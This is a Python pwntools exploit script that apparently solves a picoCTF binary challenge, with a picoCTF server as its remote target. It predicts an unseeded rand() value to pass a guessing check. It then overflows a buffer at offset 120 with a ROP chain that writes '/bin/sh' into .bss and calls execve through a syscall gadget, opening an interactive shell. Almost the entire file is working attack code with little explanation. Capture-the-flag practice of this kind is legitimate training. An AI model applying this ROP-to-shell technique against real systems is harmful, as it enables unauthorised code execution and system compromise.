#!usr/bin/python3
from pwn import *
from ctypes import CDLL

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = 'jupiter.challenges.picoctf.org', 42953

def init(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = init()
rop = ROP(exe)

# https://stackoverflow.com/questions/28254928/first-call-of-rand-without-seed-same-number#:~:text=If%20no%20seed%20value%20is,and%20thus%20yield%20different%20sequences.
# tldr; if no seed, automatically seed with 1 
# running with online compiler shows first
# value with srand 1 is 83
guess = 83 + 1
io.sendlineafter(b'guess?', str(guess).encode())

# execve('/bin/sh', 0, 0)
bss = elf.bss()
offset = 120
payload = flat({
    offset: [
        rop.find_gadget(["pop rax", "ret"])[0],
        bss,
        rop.find_gadget(["pop rdx", "ret"])[0],
        b'/bin/sh\x00',
        0x48dd71, # rop.find_gadget(["mov qword ptr [rax], rdx", "ret"]),

        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        bss,
        rop.find_gadget(["pop rsi", "ret"])[0],
        0,
        rop.find_gadget(["pop rdx", "ret"])[0],
        0,
        rop.find_gadget(["pop rax", "ret"])[0],
        0x3b,
        rop.find_gadget(["syscall", "ret"])[0],
    ]
})

io.sendlineafter(b'Name?', payload)

io.interactive()